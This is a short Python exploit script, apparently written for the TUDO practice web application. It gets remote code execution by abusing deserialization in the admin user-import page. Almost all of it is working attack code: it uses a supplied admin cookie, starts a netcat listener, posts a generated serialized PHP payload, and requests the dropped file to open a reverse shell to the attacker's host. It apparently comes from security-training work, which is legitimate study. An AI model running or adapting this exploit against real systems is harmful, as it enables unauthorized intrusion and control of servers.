# TUDO Remote Code Execution #3 - "deserialize"
# William Moody
# December 22, 2025

import requests
import argparse
import subprocess
import time
import random
import string

# Parse arguments
parser = argparse.ArgumentParser(description="Exploits deserialization in user import to get RCE")
parser.add_argument("target",help="Target URL")
parser.add_argument("cookie",help="Admin cookie")
parser.add_argument("--lhost",help="Host to listen on",default="172.17.0.1")
parser.add_argument("--lport",help="Port to listen on",default="9999")
args = parser.parse_args()

# Sanitize target URL
if args.target[-1] == "/":
    args.target = args.target[:-1]

# Start listener
print("[*] Starting listener...")
subprocess.Popen(["nc","-nvlp", f"{args.lport}"])
time.sleep(1)

# Generate serialized payload, and import user (payload)
random_filename = "".join(random.choice(string.ascii_letters) for i in range(8)) + ".php"
payload = subprocess.check_output(["php", "rce/generateSerializedPayload.php", random_filename, args.lhost, args.lport]).decode()
requests.post(
    f"{args.target}/admin/import_user.php",
    headers={"cookie":args.cookie},
    data={"userobj":payload}
)
print("[*] Imported user/payload")

# Trigger payload
print(f"[*] Triggering payload ({random_filename})...")
requests.get(f"{args.target}/{random_filename}")

# Keep shell open
while True:
    pass